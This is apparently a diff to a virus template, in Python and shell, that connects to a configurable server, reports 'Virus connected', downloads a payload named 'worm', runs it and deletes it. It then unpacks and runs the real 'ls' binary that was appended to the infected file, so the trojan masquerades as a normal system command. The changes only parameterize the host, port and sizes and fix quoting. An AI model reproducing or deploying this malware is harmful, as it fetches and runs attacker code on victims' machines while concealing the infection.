@@ -6,18 +6,18 @@ import socket
 import time
 from os import popen
 
-HOST = "server_host"
-PORT = "server_port"
+HOST = server_host
+PORT = server_port
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((HOST, PORT))
-    outdata = "\"Virus connected"\"
+    outdata = \"Virus connected\"
     s.sendall(outdata.encode())
     
-    with open("\"worm"\", "\"w"\") as f:
+    with open(\"worm\", \"w\") as f:
         while True:
             indata = s.recv(1024).decode()
-            if "\"exit 0"\" in indata:
+            if \"exit 0\" in indata:
                 f.write(indata)
                 break
             f.write(indata)
@@ -25,7 +25,7 @@ END
 
 chmod +x worm && ./worm && rm -f worm
 
-dd if=ls bs=1 skip=776 count=58869 of=my_ls.zip > /dev/null 2>&1
+dd if=ls bs=1 skip=virus_size count=ls_zip_size of=my_ls.zip > /dev/null 2>&1
 mv my_ls.zip /tmp && unzip -d /tmp /tmp/my_ls.zip > /dev/null 2>&1
 chmod +x /tmp/usr/bin/ls && /tmp/usr/bin/ls \"\$@\" && rm -rf /tmp/usr /tmp/my_ls.zip
 
